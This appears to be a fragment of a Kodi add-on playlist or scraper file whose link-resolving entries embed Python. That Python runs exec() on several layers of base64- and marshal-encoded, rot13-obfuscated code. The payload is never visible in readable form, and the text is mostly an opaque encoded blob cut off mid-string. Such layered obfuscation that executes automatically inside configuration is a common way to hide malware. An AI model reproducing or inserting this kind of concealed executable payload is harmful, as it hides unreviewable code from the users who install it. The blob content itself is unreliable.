FMTNWM3BCVVhReVRWRk1hMEZ0VWpGTVIwMTJRVzEwTWtGM1NHcEJWRlpzVFhkRmQwRjZXakJOZDBocVFWUkliVUZSY1hWQlIzZ3hRWGRhTlVGUldtMWFVVTEzV25wV01rRkhjRFZCUjFac1RYZE5kVUY2VWpCTmQweHNXbTFTYlVGSFJHMUJSMDV0UVVkTU5FRjZSREJNUjFkNlFWUmFNRnB0Y0RGQmQwZ3dRVzFFYTBGdFRETkNVVm8xUVhkd01WcEhTWFZhYlV3elRFZGFORUYzY0ROYWQwVjZRVlJNTVZwdFRERmFiVVJ0UVcxd2JGcHRkREpDVVVRd1FWUkliVnBIVERGQmQwZ3dURWRNTUVGSGRHMUNVVTEyUVVkNGJWcEhjWFZCVVVnd1FYZEZka0Y2VEcxQlVVMTNRWHBXTUUxSFNYVmFiVXd5UWxGd05FRjNkRE5NUjBWNFFYZDBNMHhIV2pCQmJYUXhRa2ROZVVFeVVqTkNVVnBzUVVkU00wRkhXakZCZDBReVFWRndhMEY2VERKQmQwUXhRWHBTTVVGSFNEQmFla3h0V2xGWGVscDZWakZDVVV3eVFWRjBNVnB0Y0cxQmJVZ3lRWGRKZFVGM1dqTmFiVTEyUVRKU01scEhUREZCVkZJeFdsRmFNbHB0VWpGQlIxb3pRWHBJTVZwUldtdEJiVm96V25kRmQwRjNUREJCZDBocVFWUk1NMEZ0U0RKYWJVUXdRVkZhYkVGM1NEQk1kMHd3UVVkTU1VeEhSWGRhYlhneVFYZElOVUZSZEcxQ1VVMTRXbTF3TTBKUmNHMUJSMVp0UWxGSWJFRnRTREpNUjB3MFFYZFdNRTFIVERKQmJVUXpXa2RGZGtGM1NEQk5kMHd3UVVkU2JWcEhSWFZCZDB3elFWRlhlbHB0Y0RKQmJVUXhRVzF3YkV4M2NYVmFiVm94UVhkSU5WcHRVbTFCUjFvMVFYZFdNa0Z0VERGQlZGWnRXa2RGZUVGSGVESmFiVm95UVhkSWJVSlJSRFZhYlVodFFXMUVNVUZSU0RCQ1IwMTVRWGQ0TWt4dFdqRmFiVkl5UWtkSWJGcHRXakpNUjFvelFVZE9NbHAzVjNwQmVsSXdUVkZNTWtGSFVteE5kMGwxUVhkV01scHRSRFZCU2xJeVduZGFNRnB0Y0cxYWQweHRRWGRNTUVGUldtMUJiVnB0UVZGWGVrRkhXakZhUjB3elducFdNa0YzVEd0QmJWSnNUSGR3YTBGNlVtMUNVVVY0UVRKU01rMUhXbXhCUjB3d1RVZE1Na0YzY0cxYWQwd3dRVkZTTTBKSFREUkJiVXh0V2tkYU1VRlVSREpCUjBocVFYZGFNa3hIU0ROQmQxb3pRVzF3TVVGUlVtMWFVVVY1UVZSU2JFMTNjR3RCYlV3d1FXMWFiVUYzVWpCYWQxZDJRWGRFTUUxSFNHeEJiVXd6UVhkTWJVRnRVbTFCUjNCcVFWUmFNbHBIVjNaQmJYZ3lRWGRGZDBGVVRERmFVWEEwUVhkYU0xcEhjREZhYlZZeFFXMXdhbHB0V2pOQlIxcHFXbTE0TWxwM1NHdGFiWGd4UVhkd01scHRUbTFhZDBWNFFYZHdNMEZIU0RSQmJWWnRXbEZJTlVGUlVteE1kM0YxUVVwU2JVRnRjREpCVVhneldrZE1Na0Z0Vm1GUlJHTmxUVXQ1WjB4S1ozbHdkazQ1VmxCeGVrZ3lTVmxGZUhCdFRYaHhTMDB5ZVd4RVNFeHRTREk1V0c5Mk9VMUdlVUZuU0VoMVYzRkdaMDlhTWpGUlFWQm1iSEpKVjFaR00wRjVia2wwTVVkSVJXWmFlRll3Y1RCeFdVZFZTREZaTUdkbWIxSXhUVWw0YTNkSlZVOVhURXBTYVc5NFUwRk1lbU5wV25oWFpXOHdOV1pNU2tWaldrbEpTRXhJVEROd2VqaHRiM2cxUW5GaFQwMUVNSEZvUmtnNVoxcGhUalJDVW10MlRFb3hWa0ZSVFdodlNtZGlSbmRYVDBSNlUwRnVNbkZyUkcxVE5rMVZRVTFIU0Zvd1NsTjFla0ZWVTBad1IwbGpSVlZCUlhCU01UWmFVVWd5UmxGQlVVcDVjVUp2U2xOTlNFaFNiRTB6Y1VwR2VreHBXak5GVkZneWNXbEtVWGxoYmtsNVIyNUxSVEZFU1dOclFXRk1OWEpWWTI1Q1VuazBTSGwxUWxwSFV6UndTR3N5V2tkSWEwcFVlVVZGZURsNWNUSlRhRUZoUVZaYWVFRjJRVEoxZUVkM2VXeGFTbVl6YmxKQlVVWXlTVEZHTW5GcGJ6QXhXbG95WjBodVZIRmhRWGw1YkVGaGREVndlV05FYmpKNWJFUjNSV3hDU2tsUWNubGFNa0pLZFVoTWJYVnBjRkE0YVhGaFRHVkllbGMwYmpCV00zRXpkWHBOUjNGNFdURjRNVnBTWjJGSlMzRkJja281TUhGNk1USndTbkV6UkhsVFUwbFVUVTFhVVhSdFFUSTBNazE1UVVGdU1VbGFjWGRGWmtwSFFVOXhiR2RCY1ZWSldVWjNUWHB3UjFKbGNIZHhWVWg2Vm14eGVGTjZUVXBGWTBGVVJUTmFSM1J0UkVvd2JFUjZhalZ2TUVsSGIzcDVZa0ZWUlV0TVMxTlBTRzFUWVVaM2VVSnhTbW8wYjBsSmFFWmhZMUZCVWsxWmNYcDFNRzlUUVdaSVJtWnFiMU5CVDBwVVJXRlpNVWhsU2twMVRXNUtjREZHZWsxa1FYZElOWEY0TlVsYWVWTkRiM2xKYTI1S2VVOU5TWGxpUWtwTlNrUnRSV0pDUjA0eGNrdEpVbkY2UlhkQ1VtZFZRVEk1WWtFd1ZqTndTRVExUVcxeE0xZ3dVMDlOTVZkclRFaFRiWEY0VTJoS2VtWXlTVkpTTVUxVldtVnhTbmx0VFZSNU5VWmhjVEpaTTNGV1FUQmlaVzVLUVUxTWRqbFdiMGw0TTBsSmRXTkhNa2xRY1RCSmFuQXlURFJNTVhVMmNsSlRla2RJVTNkQ1VVRTBiMjE1YmtWTGNUSkZWR1l5Y0ZKeFRVbEthMDFaTTFkWFJERk5XVUYzZVhkeFUwbHBSa2xGWTBGSlUxWmFVMGxpVEV0VGFscFJjVU52WVUweFRYaHhhMjh4ZVRWR1ZYRmhSVEoxWjBoNmEyRk1TR1l3V0ROMVlVUkdPVlJKUzNSdGIxUkphVXg1UldSRlNVVjNRVXBKWW05M1JWZHhla2xxUVVoblFYQjNVakp2TWpFMGNVdDVhVUpSY1VGdlVuRjRRWFk1UlVKVGNXSktVMDFSVFRCcVpWZ3lkVmx4ZGpsaFJIbEZNVTB3UVVOdlNqRnBUR3c1U2tsNVYxTkllRmRyV0RJNVlVa3dZMlJZTTFOdWIxVnhWMEpWUldkQ1UxZFVXVE5CVlhCTFRXTnlTbWRvY0cxVFpIRXpZMlJhU0dZMGJqTk5URWRTVWpWQllVVnBjREl4VFc0eU1ETktTbXRaUkcxV00wbHRUV3BhVWxOMVNETk9iWEo0Vm1sTlNsZEZSVEZPYTBaNk5XeE5SamxCUmtnMGJXOVJSWGRDVW1NelFXRkJha0V3WTJWdVNYVlJTVW81YkVsVWExRkVlV00yU25oRmVVMHpUMnBIVlZOaVJqQXhZVzVLUldGTk0wbGFXakpUUVc0eWNVTktVa2xOVERGaWJXOUllRE5hUzJNeFdERlhaa2t6UVVSR00wMUxSbTF4VmtkNk1XbENTa2hsY1VkVFlVSktUVXh2Vkhrd1dtMUlNMjVLZFZGd1NHSXlTWGhuZVc5c09EQmFNbmt5YjFWNE5Wb3pjVXBNYlVWWlJuaGlhM0Y0UVhkeFNYVkVTbnBOVTBwUlYyRmFVRGxYUkhkSWJVY3dNVUZJZW10UFdqRlhZMGhoVjBKTVMwbG5SMUZKU1VaVlNYcHVNMEZuUkhkWGVuRXlRV1J2VTFkdWNWSk5hVXd6Y1ZOdVNrd3pTVWRGVm5CaFkwSnVNRkpxUVVkVGJtOTNVM3BFZVhsWlFYcDVVbHBUU1cxYVNHdFRSSGxYVjNCS2RETnVNbE5tV1cxQlMwRktUV2R2UjA5SFFWVlhkMjV0ZVVKYWRqbGpTa3AxVFVaSFRVVkVTMHd4UkRGTlFWb3pUMXBFUzNScWJuZGFaVWRTT0RSRVMxZEtSSGQ1UjI4eWRUWmFVbGRxUjBkd2FrVkhkVzFLZWtReGNFcEVORXBTWTJORlIwRldTbmh4UlVwNVJVeENTRUZHUkVvMGFYSlRkR3hKYlU5MWNrZFBXVXAzZEdsd1ZEVnBjREpKUkc4emNHcEZNSFZ0U25wNVQxcDVZalJKU2pGVlIxUlhOSEJUZUcxS2VqRmpRVkp4YUVFeWRUSnVWVTE1VEV0NVdHOHdkR3B1TVZkSFFWSTBNM0pJU1dsSVVVbGhXa2ROU25CUmRXaE5TbUl3Y2tneFpYSkxRV3hNU25sRFNEQTFXRXBKVjIxTllXTjNURXB4VVV3d1JHVndlalZpYmxSV2FVZ3dZbXhLZDNWblNWSm5hRXhKVFZGeFVWWXpSakE1YkUxTFlteElSM2xuV2xGMVFVeEhRWGxhVlU5cFJESlRXbGd3Y1dSd1NrRk5TSHBCYVVFd05XZEtSMEZRYmpJd00wWkpUVEpIUzBRMVIwdEpXVzlLU1UxSlNGWXhXVEJ4YUVZeVVqUkZlWFJ0UlRKalNrWjZkVk53UzJKc1JVaDVVRVF6VjBWdVlVNDFXbEZGVjNGSWVWbElTSEYzY0ZOQmRrbFJkVEp2UjNWMmIzcGpVVzlMUVRad1lVMUpjVkl3TTI4d1FVaFlNVk16Um0xSk1rY3pkR3BIYlhscmJuZFRlVWt5UlV0WU1VaHBUSGRJTlV4SlJXRlliWFZNUWt0WGRuSkdPV0pIVkVWaGNVaEJhMGgzZFUxdU1VOUVRVlIxZDBoM2NWWnVlRFJxUVVvNVUyOUtVMEpJUzBGcVJ6SjFka1YzVDBWQ1VtY3pSVWRCZWtGSVkzcEpNRGxDUVhkRllYSkplVVJCTURoc1IyMXhabTU0Y1hWd1VsTk1TREpTYTBKSVFVaGFNakY0U0RCYWJFMUtVelZNYlVGVVRUQTBiRzk0YTB0SWQxZGxjWGx4ZVc1UU9HMXdkM0ZaYjBsVFVGZ3lhME5IU1ZkUVJFWTVha2RJT0dwR2VtTkliMVZYVDNGS05WcFpNSFExUmpJMVYwZFFPVk52ZVZZd2NVaFRVRWQ2TVVKRWVtYzJRVzFKZW05NlozaFlNVWxXY0dGSmVrWlRSVTl2ZWpnemJqTkJTbHBWVW10QlNuVnRSa2hUYTBKSVJXNXdlRWxFYmtwclVFeEdaak54UzFkQlJraHdiRWxVWTBwTllYRk1Ra2cxWW01VlZtVnZiWFY1UjNveE1FZEhWbXR4YkRocldqSjFXazFVU1VGeGVuRlljRXBCUlVRelJVcHVWRUV6U0hoblYwY3ljWHBCUjNWUlNERklNM0pMZFhWdlVWZG1iakpxTUhGNVUwbEVNalYxU1RJNVExbHNaMWx1ZUUxdGNWSkpRVVI2UldGTWVuRkZjWHB3Tlc4d1oyeHdNVTR3V0cxd2FWcFZUbXR5U2tnd2NUTlROa2RWUVhkRk1rbFBXak5CTVVGS1RHbHdNM0YzUjBwQmJVVlJkVkJ4TUdzMVIxVlhlVUZWUVhsS2VrRk1XbmR4VVUweGVYVnZTazB4YnpKd05IQjVVMWh5UzFvMFRWUnhRVWxLTkd4TlNtTjZTRXAxVjBwTFUyZEtlVmRNY1VkRVpVcEhTV2R5WVV3eVIwcHJlbHBTU0RCTVNIaHBXRzFGVUhKNVlqTnhZWGxYV0RJeFJVSlNaMU53WVhGaFIwcEpha3hoUVRCYWVFd3dSWGhpYVV4TFRVTkdNalZJU2twNU5rcExZekpLZUdOM2JraEZTbTU0VTBOdWVubDVXakkxZUZwTFV6QlpNalF4UmxGVGVrZEhkWHB4VkhsSFRVbzBNa0pLVTJGeFMwbHRXbmc0TUVoM1UxUkhTazF1Y0RCNVlrMHhlREphTWxOYVduWTRNMGRLU1hkR1NGZG1iMGh4ZFVkTGRXMUJWV050YmtwMWRYRmhSVFJ4ZWxONWIwZFdaWEo1U1dkRlNqRnNjRXRKU1VaS2VWWnVNR05uUVhZNWRVVktUV0ZFUjFkNmJraGFOVUZJU1dwYWVWTmpSR0ZUWVVsVldqTkJVWGwxV2tsNVkwMTVWelZ2ZUVWblJHRkliVnBLT1hoWk0xTllTa2hUVUVFd01WVmFNR05rY0hsQmJVSktPVkZhVkdzd1FrZHhUMFF3TVUxeE1YVTBSbUZUUmxwSGVUWmFlVXcxYmpKVFYzQnRjVlpNU25ReGNUTlhUVXBoVDFsSllYbEpRVE5CZFhFeVkxRkpVMFZSY25nMWEwRXlSVU5CTW1OblRWSmpkVWQ0VjBSQ1MxTXhiak5YWW5KR1oxQkViVWx0Y2tnNVowSlVVM1pHVlVGRlFUTnhhbG93ZVd0RU0wRXhXRzE0TUZreVowWk5NMEZQU1VoVGJVWXdNV3B2U21kbmNsQm5RVnBKU1hsR1IwbGhXVE5XTVZveVowOU1NMDlwY1RCWFlsa3dZekZ1TTFKdGNETlRaSEpLWXpCeGVWSTBja2huZDFwSWVUVlpNakZJU0RCRlRVSklSR1Z3YlhVeFRIZEpkWEZoVjFWdlNYRjNSR3huYlVKVFNEUndNbmxCVEVZNVdrZEtPVXRGTUUxRGNsSlNaVVpJUVVseFNuUmxiekJOZG05NFNETlliWGxNUmpKWGFsa3lVbXBaTWpGVVJYaDVNMWt5TUdsSmRtZFFRa294WlV4R09YWkhTMWRWUVhsSWJVUjZWakZhUzFveFJsQm1hVWx0Y1hwdVZVRnVjVEk1VEVwS2RVWlpNbWN4VFhZNVFYQjZWMnhaYlZkM1NVaFRiVmt6ZFhkYVlXSTBXbFJUU0ZneWVHbEhWVUZOUWt0QlQxcFRURE51YlZZMFRUSXdaVm93VjI1R1NGWnBSVk5hTWtsR1oxWnZWRGsxYjNabldXOHpXak53TWtsalFWQTRhVUpVZFZsWU0zQnNUV0Y0YWxnd2NXbENVM1ZMY2xORlNVRXlSV3BFZUdZd1JEQmFNVmt5Y1V4RWVuRmpSbFJqWlZnelZ6RnVWVWsxUVRCalpFWjRlREJGZUd0aVdqQlhZWEYzZVdaYVVrMTJjSGQwYWt4NlJXSnZiVXhsUjNwbldWcEtWME5CZGpsRldqTjFhMjlMUVhoeWVIRlFRbEE1VFVwNFFYZHhNMGxTV0RKTmRVUXlRWFZ4U21abFFUTlNOWEJLTlhWdllWTkhXVE5QWlc1U2FtbENSM2x0YjFOTlIzQjRRVXB2TWpFeWNtRmFiVVl5ZUdWS1NIVnVSMGRKWTBSSWREUndWVnBsYmtZNVpsa3pTV2xaYkRsVVNWRmFOVXhMUVd4eVNFRkpSREpuVUVSdFRHVktlRk5WUVZCbmJYRkdaMkp3TVdOUVJUSkJaVUpMVDFKSVNGcHFia2xUV1VKR09XUkJiWFF4V1RKMVdsbHRkR3hZYlhsMmNHMWFaVUZIZUdsWWJYVmxXVEZUWjBaNlVqQmFVVmRrYjNwbk5rMTNVak5FTTAxalFrWTRNVUZMY1ZGSU1uRTBjbEk1UzAxM2RVUlpiVVJwUlhwSU0yNVRTVmxLVTNrd1NuWTVNMEZIZFZGR2JHZHBiak5KTWtwTFdtdGFiVTFVUWxSWGRWa3dZMkpKTTBWaFJHdzViVUZKU1dKQllVRlhTa2ROYWtaNFoxSndNRWhwYmxWamEwcDNUMk5hTTBGM1JESXdhMGd5YTFkSE0wOW9ibFEwTkZrd1pqQk1iR2QxV1RKTlkzSkxRWGxhVUdkblNVZFBiVmd5VTJkSFJqaGxjWHBUYlVKU2RXSkpWSEExV1d3NGFVUmhWbWxaTUZveVdXdzRORUZVZURCR1VYQnBRVVk1YkZsc09VbEJNazB6Ym5obllsa3djVzFITVhWUlNUTmlZVkZFWXpadVNqbG9WbEV3ZEZjeGF6UkJiVmR3Y2xGTmVrdFZkRE5CVTJzMFdtMVRjSEpSV20xWGFqQlliM3BKYVZaUk1IUk5TMDExYjFCMFlVdFZkREphZVdzMFFYZDVjSEpSVFhsTFZYUXlXa2xyTkVGdFFYQnlVVXh0UzFWME1rSkphelJCZDNsd2NsRlhlVXRWZEROQlNXczBRWHBKY0hKUlREUkxWWFF5UVVsck5FRnRkWEJ5VVUxM1MxVjBNa0pKYXpSQmQwMXdjbEZ3TlV0VmRHeENVMnMwUVhwRmNISlJUWHBMVlhReldubHJORUZ0VDNCeVVVdzBTMVYwTWtGSmF6UkJiVWx3Y2xGd2JVdFZkR3hDU1dzMFduZE9ZVmhHVG1WV1ZFa3lURXBxWWxjeGF6UkJkMEZ3Y2xGTmVrdFZkREpCVTJzMFFYZEpjSEpSVEcxTFZYUXpXakZyTkZwNlNYQnlVVXd3UzFWME1rRkphelJCZDBGd2NsRk5la3RWZERKQlUyczBRWGRKY0hKUlZqUkxWWFF6UVZOck5FRnRWM0J5VVV3MVMxVjBNazFKYXpSQmQzbHdjbEZ3TUV0VmRETkNTV3MwV25wQmNISlJWbXBMVlhRelRFbHJORUYzZVhCeVVVMTZTMVYwTWsxSmF6UmFkM2hoV0VaT1pWWlVTVEpNU21waVZ6RnJORUYzVjNCeVVVdzFTMVYwTWsxSmF6UkJkMU53Y2xGd2JVdFZkREphTVdzMFFYZDVjSEpSVERWTFZYUnNUVWxyTkVGdFNYQnlVVTE1UzFWME1rSlRhelJCZDBsd2NsRndORXRWZERKTU1XczBRWGQ1Y0hKUlRESkxWWFF6UWtsck5GcDNkWEJ5VVUxNlMxVjBNMXA1YXpSQmQxTndjbEZNYlV0VmRESk1NV3MwUVhkSmNISlJWalZYYkhoMFdHeFBlWEY2VTJaWVVIRndjbEZNYlV0VmRESk5lV3MwUVhkRmNISlJUREZMVlhReVdqRnJORUZ0UVhCeVVWZDVTMVYwTWtGVGF6UkJkMGx3Y2xGTWJVdFZkREpOZVdzMFFYZEZjSEpSVERGTFZYUnNRbE5yTkVGNlYzQnlVVXd4UzFWME0wSkphelJCZWtWd2NsRk1hMHRWZERKTWVXczBRWGRKY0hKUmNHeExWWFJzV2xOck5GcDZRWEJ5VVZacVMxVjBNMHhKYXpSQmQzbHdjbEZOZWt0VmRESk5TV3MwV25kNFlWaEVNRmhOUzAxMWIxQjFkMjh5TVdwdVNtdDVXRlZqWm01S1ZtaE5WRWwzYnpJeGFuQjZTVzF3YkhWMlRFdEJlVUYzUkdoTWQwd3dUVlJKZDI4eVJYbFlWRWt5VEVwcVlsY3hhelJCZWtsd2NsRk1NVXRWZERKTmRuQmpXRVo0WmxkdGEyMXhWVmRqYjNwd0sxZHNhbUZOUzNWNVRHeHdZMWhFUFQxMEJRQUFBSEp2ZERFemN3a0FBQUJ0YjNKd2FHVjFjeUJ6SEFBQUFHTnZaR1ZqY3k1a1pXTnZaR1VvZEhKcGJtbDBlU3dnZW1sdmJpbDBCZ0FBQUc5eVlXTnNaWE1lQUFBQVkyOWtaV056TG1SbFkyOWtaU2hyWlhsdFlXdGxjaUFzSUhwcGIyNHBkQU1BQUFCdVpXOXpDQUFBQUR4emRISnBibWMrZEFRQUFBQmxlR1ZqS0FzQUFBQjBCZ0FBQUdKaGMyVTJOSFFHQUFBQVkyOWtaV056ZEFnQUFBQnRiM0p3YUdWMWMzUUhBQUFBZEhKcGJtbDBlVklFQUFBQWRBZ0FBQUJyWlhsdFlXdGxjblFFQUFBQWVtbHZiblFFQUFBQVpYWmhiRklGQUFBQWRBY0FBQUJqYjIxd2FXeGxkQWtBQUFCaU5qUmtaV052WkdVb0FBQUFBQ2dBQUFBQUtBQUFBQUJ6QmdBQUFITmpjbWx3ZEhRSUFBQUFQRzF2WkhWc1pUNEJBQUFBY3c0QUFBQVlBUVlCQmdFR0FRWUJCZ0VxQVE9PSIpKSk="))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MEJSa0FBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFV1RGTmVtc3pUbFJTYlUxNldUTk5lbU40VGxSamVrNVVXVEpPZWxVeFRXcGthRTV0UlhwUFZHTjZUbnBGTVUxcVRURk5la2t5V1hwWmVFNTZTVEZPVkUwMFRtcGpNVTU2WXpWT1JGa3lXWHBTYUU1VVp6Rk5lazAwVGtSbmVrMXFVVFJPVkVVeVRsUmFhVTVIVFhsWmFsRjZUWHBCTWs1RVZUSk5lbU13VFZSWk5VNTZhekZOZW1NMFRrZFJNazVFV1RWT2FrMHdXVlJTYWs1RVozcFBWRTAxVGxSUmVrMVVVVE5PUjFreFRVUlpNVTU2UlROTlZHTjRUa2RWTVU1NlkzaE9lbWQ2VDFSWmVFNVVZek5QVkZwclRsUmpNRTlVVlhsT2VtTXpUMFJWTlUxNlJYcE9lbEV6VG0xVk1FNUVVVEpPUkdkNlRucFJORTF0V1hwT2FrMHpUbFJuTWs1Nll6Qk9ha2t6V1ZSS2FVNVVRVEZOUkUxNlRYcG5lazU2VVRCT1JHZDVXbXBOTlU1NmF6TlpWRXB0VFhwcmVrNVVZM2hPVkZFelRsUlZORTF0V1hsYWFtTTFUWHBGZWs1NlNtbE9hazB5V2tSS2JVNVhSWHBOYWtwdFRXMVpNMWxVWXpCT2VrMHhUVVJLYlUxNlkzcFBSRlV6VGxSbmVrMXFXWGxOZW1ONlQxUmpORTVVU1RGTlJGcHNUWHBOTTA1cVNtMU5lbGt5V1hwak1VNXFVWHBOZWxsNVRtMUZlVmxxVlhkT2JVVjZUbnBOTTAxdFdYcFBWR00wVFhwSmVWbHFTbTFOYlVsNlQwUlZkMDU2YXpKTmVscHJUbTFGTVU1NlZUUk5lbEV4VG5wTk0wNTZSWHBOZWsxM1RYcE5NbHBFVVRKT2Vsa3hUV3BqZVU1cVdUQlplbU13VGxSck1rOUVZM3BOYlZrelRrUldhRTVVVlRGT2FtTXdUbXBWZWsxNldUUk9ha2t5VG1wYWFrNVVXVEZQUkdONFRrZFZNVTVFVFhwT2JVVXlUMFJhYUU1dFNUSk9WRlpvVG1wRmVWbHFVbXRPYWxrelQxUk5NVTVxVlRCTmFsa3hUakpGTTA1cVdUVk9lazB3VGtSYWFVNVhSWHBQUkdNMVRsUlZlazE2VFRGT2FsRjZUbnBrYUU1VVp6QlBSR015VGtSSmVrNTZXWGxPYlUwelQwUlplRTU2V1RGTlJGSnNUWHBWTUZwRVVUVk9WRUV5V2xSTmVrNTZVWHBOZW1OM1RYcFZNVTE2VVhoT1ZHTjVXbXBaTkUxdFNUSlplbU42VGxSVmVrNTZXbWhPYlVWNVdtcFZNazVVYXpKYVJFMTVUbnBSTTAxcVdYaE5lbGw2VGtSWmVVNXFSVEpPVkZWNVRtMUZNazFVV1hwT2FtTXpUMFJSTTA1NlJURk9lbFV5VGpKRmVrOVVXVEZPZWtFd1dsUlNiRTVYUlRGT2FsVXhUbXBOTTA1cVVUTk9SMVY2VDFSV2FFNXRSWHBOUkZKclRtcG5NVTFxV1hoT1JHc3hUbFJWTWs1RVVURlBSRkUxVFhwbk1sbFVWVEJPUjBrd1dsUkthVTU2U1RGT2FsazBUa1JqZWs1RVZURk9WRmw2VFZSTmVVNTZWVE5OYWsxNFRrZFpNVTE2VFRCTmVrVXhUa1JaTlU1RVp6Rk9SRkUwVGtkVmVrOVVUVE5PVkZVeVRWUmFhMDU2U1RCWmFsRTFUbFJKTTA1cVNtbE9lazB6VDFSak5FNXFWWGxaYWxwb1RsUkJNVTU2VFRKT2VrMTZUa1JqZVU1Nlp6Tk9WRkUxVG1wcmVrMVVWWGROZWxFeldWUlZkMDVFWXpCT2VtTjNUbnBOTVU1VVRUSk5la1V4VDBSTk1FNTZXVEZQVkZwdFRucEpNRnBxV1RCT2Fra3lUVlJTYUU1cWEzcE5lbU0wVG5wWk1sbFVWWGhOZWsweVRWUlZNazU2YXpOT1JGSnBUWHBuTTA5RVl6Sk9ha2t4VGxSWk1VMTZaek5OUkVwcFRsUmpNVTFVV1RKT1IwVjZUV3BTYVU1RVZUSk5ha3B0VGtkVmVrMVVUWGhPVkZVd1dtcFNiVTVVVFRGTlJGRTFUa1JyTTAxcVVUSk9SMWw1V1dwWmVrNVVTWHBQUkdOM1RucEpNVTVFVW1sT1ZHc3hUbnBOZWs1dFRYbFphbGsxVG1wRk1VNXFVbWhPZWxFeVRWUlJNazVxV1RCYVJGRXhUbGRGTVU5VVl6Vk9iVlV3V1hwak1VNUhVWHBPUkZwdFRYcE5lazE2V1hoT1JHTjZUWHBOTTA1VVl6QmFWR013VG1wWk0wNUVWVFZPVkdNelQxUlpNRTR5UlRGUFZFMTVUWHBCTWs5RVdUSk5la2w2VFZSUmVFNVVVVE5OZW1NMVRtcFplazVFVFhoT2JVbDVXV3BOZUUxNlNUQmFhbEV4VGxSUmVrNXFUVEpPUkZFeVRtcFZNazVxVVhwT1JHTXlUWHBuTTAxVVVteE9WRUV3VFhwTmVFNTZSWHBPZWxwclRrZFZNazVFV1hwT2FsRjZUMFJhYWsxNlZUQmFSRkpvVFhwWk1VOVVaR2hOZWtVeVQxUlJORTVxU1ROUFJGa3lUWHBaTTA1RVVtcE5lbGw1V1dwVmVrNUVaM3BPVkZWM1RtMVZNVTFVVVRGTmJWa3hUVlJqTkU1RVdURk9hbFV5VGpKRk1VNTZZM2xPYlZsNlRYcGpORTVxVFRKWmVsazBUbFJuZWsxNlVtaE9lbGt4VFhwUk5VMXRXWHBPYW1NelRucEplazlFV1hsT1JHTjZUbnBOTVU1cWEzbGFhazE1VGxSbk1GbDZUVFZPZWxVeFRucGpORTU2YXpOTmFsbDRUbXByTTA1NlkzbE9hbXN6VFhwWk5FNUVSWGxaYWxWNlRucE5NVTVFV21sT1ZFRXdXbXBaTUU1VVNUTk5hbHB0VG1wSk0wNUVaR2hPUjFrelRWUlNhRTE2YXpCTmVtTjVUbXBWTWs1VVZYZE9hazB6VFVSVmVFNXFSVE5PYW1NeFRtcE5NbHBVU20xT2Ftc3pUWHBqTkU1dFJYcE9WR1JvVGxSSk1VMUVXVFJPZWxreVdtcFpNazVIUlhwTmFsa3hUbnBOTUZwVVNtbE5lbWN6VFVSTmVrNTZZek5QVkUxNlRtcFpNazFVVlRCT1ZHY3dUbXBTYVU1RVozcE5lbU40VGtSWk1scFVUWGxPYWtWNlQwUmplVTE2V1RKYVZHTjZUWHBqTTAxcVVtdE9hazB4VGtSTk1VNUhVVEphVkUwelRtcFJNVTU2V20xT2Fra3pUWHBhYlU1RWEzbFphazEzVG1wcmVrMTZZM3BPYlZVd1drUkthVTVVVlROWlZGVXlUa2ROZWs1RVZYaE9SMWt4VG1wUk1FNUVaM3BPVkZWNlRYcGpNRnBVVlhkT1Ixa3hUbFJOTkUxNlp6Qk9WRmt5VG1wRk1GbDZTbWxPZW1jeVQwUmFhazR5UlROT2VsRjRUWHBuTTA5VVZYZE9hazB4VFhwWmVVMTZhekJOVkZreVRYcGpNRTFxU20xT2FrMHhUVVJaTVUxNlFUQk9WRTAxVGtkSk1rNXFUVEpPUkVWNlQwUk5lazVFU1hsYWFrMDFUbnBuZWs1cVdYbE9hbGt5V1ZSU2JFNXFZekphVkUweFRrUk5NazlFVFROTmVsa3dUbFJLYVU1RVp6QlBSRkY2VGxSQmVrOVVVWHBPZWxrelRsUlplRTU2WXpOUFJFMHpUWHBSTWs1cVZYaE9hbFY2VDFSYWJFNXFTVEJOVkVwdFRYcGpNRmw2VlROT1JFMTZUbnBhYUU1RVJUTk9hazE0VG0xWk1VMUVUVFZPZWtVd1RsUk5ORTVxU1RKT1ZHTjZUWHBuTTA5RVVteE5iVWt6VG5wTk1rMXRXVEpaZWxVd1RYcEpNVTU2WXpCT1ZFRjVXV3BSTWs1dFVURk5lbU4zVG0xTk1GbFVZelZPVkdzd1RtcGthRTVIUlRGUFJFMDFUbFJGTWs5RVdYbE5lbGt5VGtSUmVFNUhUWGxhYWxGNFRtMUZNMDFxVlRKT1JGa3pUbFJOTkU1dFNYcE5WRlYzVG5wWmVrOUVVbWhPYWxVeFRYcFpNVTE2VVRGUFJGa3hUWHBaTVU5RVdURk9WRTE1V1dwa2FFNVVWVEpPZWxGNVRXMVpNMDlVV1ROT2JWVXdUbFJOZWs1VVFYbFphbEpvVFhwWmVWbHFVWGxPZWtsNlRYcFJlazVxV1hwTmFsa3pUbFJuTTA1cVVtMU5iVmt4VGtSU2FrNHlSWGxhYW1NelRtMUZNVTFFVFhoT2FtY3hUMFJOTVU1RVNUTk9hbHBwVFhwRk1GbFVXVEpPZWswd1RucFJNVTVVV1hwTlJGa3lUVzFaTTA1NldUSk9iVTB3VG1wVmVVNUVTVE5QUkdNeFRucE5NMDVVVFROT1YwVXpUVlJaTWs1VVZYcE5WRTAxVGxSRk1rMXFXWGhOZW1jeVRucGFiRTE2VlRGT1JGcHRUbFJqZVZscVRUQk5lbU16VDBSUk5